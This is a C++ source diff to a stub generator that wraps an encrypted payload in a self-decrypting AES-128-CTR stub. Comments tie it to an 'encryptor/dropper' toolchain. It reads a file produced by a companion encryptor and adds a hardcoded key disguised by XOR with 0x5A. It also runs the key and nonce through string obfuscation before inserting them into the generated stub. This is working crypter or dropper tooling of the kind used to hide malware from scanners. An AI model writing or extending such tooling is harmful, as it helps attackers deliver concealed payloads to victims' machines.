@@ -250,6 +250,13 @@ private:
         return result;
     }
     
+    // Simple random number generator (same as encryptor)
+    inline uint32_t simpleRand() {
+        static uint32_t seed = 0x12345678;
+        seed = seed * 1103515245 + 12345;
+        return seed;
+    }
+    
     std::string generateStubTemplate(const std::string& stubType) {
         if (stubType == "basic") {
             return R"(
@@ -265,7 +272,7 @@ private:
 {KEY_DEFINITION}
 {NONCE_DEFINITION}
 
-// AES-128-CTR implementation
+// AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -285,18 +292,173 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
-// AES decryption functions (simplified for stub)
-void aesDecrypt(uint8_t* data, size_t dataLen, const std::string& keyHex, const std::string& nonceHex) {
-    // Convert hex strings to bytes
-    uint8_t key[16], nonce[16];
+// Round constants for key expansion
+static const uint8_t rcon[10] = {
+    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
+};
+
+// AES helper functions
+inline uint8_t gmul(uint8_t a, uint8_t b) {
+    uint8_t p = 0;
+    for (int i = 0; i < 8; i++) {
+        if (b & 1) p ^= a;
+        bool hi_bit_set = a & 0x80;
+        a <<= 1;
+        if (hi_bit_set) a ^= 0x1b;
+        b >>= 1;
+    }
+    return p;
+}
+
+inline void subBytes(uint8_t* state) {
     for (int i = 0; i < 16; i++) {
-        key[i] = std::stoi(keyHex.substr(i*2, 2), nullptr, 16);
-        nonce[i] = std::stoi(nonceHex.substr(i*2, 2), nullptr, 16);
+        state[i] = sbox[state[i]];
+    }
+}
+
+inline void shiftRows(uint8_t* state) {
+    uint8_t temp;
+    // Row 1: shift left by 1
+    temp = state[1];
+    state[1] = state[5];
+    state[5] = state[9];
+    state[9] = state[13];
+    state[13] = temp;
+    
+    // Row 2: shift left by 2
+    temp = state[2]; state[2] = state[10]; state[10] = temp;
+    temp = state[6]; state[6] = state[14]; state[14] = temp;
+    
+    // Row 3: shift left by 3
+    temp = state[3];
+    state[3] = state[15];
+    state[15] = state[11];
+    state[11] = state[7];
+    state[7] = temp;
+}
+
+inline void mixColumns(uint8_t* state) {
+    for (int i = 0; i < 4; i++) {
+        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
+        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
+        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
+        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
+        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
+    }
+}
+
+inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
+    for (int i = 0; i < 16; i++) {
+        state[i] ^= roundKey[i];
+    }
+}
+
+inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
+    uint8_t temp[4];
+    
+    // Copy the original key
+    for (int i = 0; i < 16; i++) {
+        roundKeys[i] = key[i];
     }
     
-    // Simple XOR decryption for stub (full AES would be too large)
-    for (size_t i = 0; i < dataLen; i++) {
-        data[i] ^= key[i % 16] ^ nonce[i % 16];
+    for (int i = 4; i < 44; i++) {
+        for (int j = 0; j < 4; j++) {
+            temp[j] = roundKeys[(i-1)*4 + j];
+        }
+        
+        if (i % 4 == 0) {
+            // RotWord
+            uint8_t t = temp[0];
+            temp[0] = temp[1];
+            temp[1] = temp[2];
+            temp[2] = temp[3];
+            temp[3] = t;
+            
+            // SubWord
+            for (int j = 0; j < 4; j++) {
+                temp[j] = sbox[temp[j]];
+            }
+            
+            // XOR with Rcon
+            temp[0] ^= rcon[i/4 - 1];
+        }
+        
+        for (int j = 0; j < 4; j++) {
+            roundKeys[i*4 + j] = roundKeys[(i-4)*4 + j] ^ temp[j];
+        }
+    }
+}
+
+inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
+    uint8_t state[16];
+    
+    // Copy input to state
+    for (int i = 0; i < 16; i++) {
+        state[i] = input[i];
+    }
+    
+    // Initial round
+    addRoundKey(state, roundKeys);
+    
+    // Main rounds
+    for (int round = 1; round < 10; round++) {
+        subBytes(state);
+        shiftRows(state);
+        mixColumns(state);
+        addRoundKey(state, roundKeys + round * 16);
+    }
+    
+    // Final round
+    subBytes(state);
+    shiftRows(state);
+    addRoundKey(state, roundKeys + 10 * 16);
+    
+    // Copy state to output
+    for (int i = 0; i < 16; i++) {
+        output[i] = state[i];
+    }
+}
+
+inline void incrementCounter(uint8_t* counter) {
+    for (int i = 15; i >= 0; i--) {
+        counter[i]++;
+        if (counter[i] != 0) break;
+    }
+}
+
+inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
+                       const uint8_t* key, const uint8_t* nonce) {
+    uint8_t roundKeys[176]; // 11 rounds * 16 bytes
+    keyExpansion(key, roundKeys);
+    
+    uint8_t counter[16];
+    uint8_t keystream[16];
+    
+    // Initialize counter with nonce
+    for (int i = 0; i < 16; i++) {
+        counter[i] = nonce[i];
+    }
+    
+    size_t processed = 0;
+    while (processed < length) {
+        // Generate keystream block
+        aesEncryptBlock(counter, keystream, roundKeys);
+        
+        // XOR with input
+        size_t blockSize = (length - processed < 16) ? length - processed : 16;
+        for (size_t i = 0; i < blockSize; i++) {
+            output[processed + i] = input[processed + i] ^ keystream[i];
+        }
+        
+        processed += blockSize;
+        incrementCounter(counter);
+    }
+}
+
+// Convert hex string to bytes
+void hexToBytes(const std::string& hex, uint8_t* bytes) {
+    for (size_t i = 0; i < hex.length(); i += 2) {
+        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
     }
 }
 
@@ -305,8 +467,13 @@ int main() {
     uint8_t encryptedData[] = {EMBEDDED_DATA};
     size_t dataSize = sizeof(encryptedData);
     
-    // Decrypt the data
-    aesDecrypt(encryptedData, dataSize, {KEY_VAR}, {NONCE_VAR});
+    // Convert hex strings to bytes
+    uint8_t key[16], nonce[16];
+    hexToBytes({KEY_VAR}, key);
+    hexToBytes({NONCE_VAR}, nonce);
+    
+    // Decrypt the data using AES-128-CTR
+    aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
     
     // Write decrypted data to file
     std::ofstream outFile("decrypted_output.bin", std::ios::binary);
@@ -438,53 +605,62 @@ public:
     void generateStub(const std::string& inputFile, const std::string& outputFile, 
                      const std::string& stubType = "basic", bool useRandomKey = true) {
         
-        // Read input file
+        // Read input file (already encrypted by native_encryptor)
         std::ifstream inFile(inputFile, std::ios::binary);
         if (!inFile.is_open()) {
             std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
             return;
         }
         
-        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
-                                     std::istreambuf_iterator<char>());
-        inFile.close();
-        
-        if (fileData.empty()) {
-            std::cerr << "Error: Input file is empty" << std::endl;
+        // Read the nonce from the beginning of the encrypted file
+        uint8_t nonce[16];
+        if (!inFile.read(reinterpret_cast<char*>(nonce), 16)) {
+            std::cerr << "Error: Cannot read nonce from encrypted file" << std::endl;
             return;
         }
         
-        // Generate or use provided key/nonce
-        std::string key, nonce;
-        if (useRandomKey) {
-            key = generateRandomKey();
-            nonce = generateRandomNonce();
-        } else {
-            // Use environment variable or default
-            const char* envKey = std::getenv("ENCRYPTION_KEY");
-            if (envKey) {
-                key = envKey;
-                // Pad or truncate to 32 hex chars
-                while (key.length() < 32) key += "0";
-                if (key.length() > 32) key = key.substr(0, 32);
-            } else {
-                key = "0123456789abcdef0123456789abcdef"; // Default key
+        // Read the encrypted data
+        std::vector<uint8_t> encryptedData((std::istreambuf_iterator<char>(inFile)),
+                                         std::istreambuf_iterator<char>());
+        inFile.close();
+        
+        if (encryptedData.empty()) {
+            std::cerr << "Error: No encrypted data found" << std::endl;
+            return;
+        }
+        
+        // Use the same key system as encryptor/dropper
+        constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;
+        uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
+        constexpr size_t keyLen = sizeof(encKey);
+        
+        uint8_t key[keyLen];
+        const char* envKey = std::getenv("ENCRYPTION_KEY");
+        if (envKey && strlen(envKey) >= keyLen) {
+            for (size_t i = 0; i < keyLen; ++i) {
+                key[i] = static_cast<uint8_t>(envKey[i]);
             }
-            nonce = generateRandomNonce();
+        } else {
+            for (size_t i = 0; i < keyLen; ++i) {
+                key[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
+            }
         }
         
-        // Encrypt the data
-        std::vector<uint8_t> encryptedData = fileData;
-        uint8_t keyBytes[16], nonceBytes[16];
+        // Prepare AES key (expand or truncate to 16 bytes)
+        uint8_t aesKey[16];
+        for (size_t i = 0; i < 16; ++i) {
+            aesKey[i] = key[i % keyLen];
+        }
         
-        // Convert hex strings to bytes
+        // Convert to hex strings for stub
+        std::string keyHex, nonceHex;
         for (int i = 0; i < 16; i++) {
-            keyBytes[i] = std::stoi(key.substr(i*2, 2), nullptr, 16);
-            nonceBytes[i] = std::stoi(nonce.substr(i*2, 2), nullptr, 16);
+            char hex[3];
+            sprintf(hex, "%02x", aesKey[i]);
+            keyHex += hex;
+            sprintf(hex, "%02x", nonce[i]);
+            nonceHex += hex;
         }
-        
-        // Encrypt using AES-128-CTR
-        aesCtrCrypt(encryptedData.data(), encryptedData.size(), keyBytes, nonceBytes);
         
         // Generate stub template
         std::string stubTemplate = generateStubTemplate(stubType);
@@ -498,13 +674,13 @@ public:
         // Replace key definition
         pos = stubTemplate.find("{KEY_DEFINITION}");
         if (pos != std::string::npos) {
-            stubTemplate.replace(pos, 16, obfuscateStringWithVar(key, keyVar));
+            stubTemplate.replace(pos, 16, obfuscateStringWithVar(keyHex, keyVar));
         }
         
         // Replace nonce definition
         pos = stubTemplate.find("{NONCE_DEFINITION}");
         if (pos != std::string::npos) {
-            stubTemplate.replace(pos, 18, obfuscateStringWithVar(nonce, nonceVar));
+            stubTemplate.replace(pos, 18, obfuscateStringWithVar(nonceHex, nonceVar));
         }
         
         // Replace embedded data
@@ -539,10 +715,10 @@ public:
         std::cout << "  Input file: " << inputFile << std::endl;
         std::cout << "  Output stub: " << outputFile << std::endl;
         std::cout << "  Stub type: " << stubType << std::endl;
-        std::cout << "  Original size: " << fileData.size() << " bytes" << std::endl;
+        std::cout << "  Original size: " << encryptedData.size() << " bytes" << std::endl;
         std::cout << "  Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
-        std::cout << "  Key: " << key << std::endl;
-        std::cout << "  Nonce: " << nonce << std::endl;
+        std::cout << "  Key: " << keyHex << std::endl;
+        std::cout << "  Nonce: " << nonceHex << std::endl;
     }
     
     void generateBatchStubs(const std::string& inputDir, const std::string& outputDir,
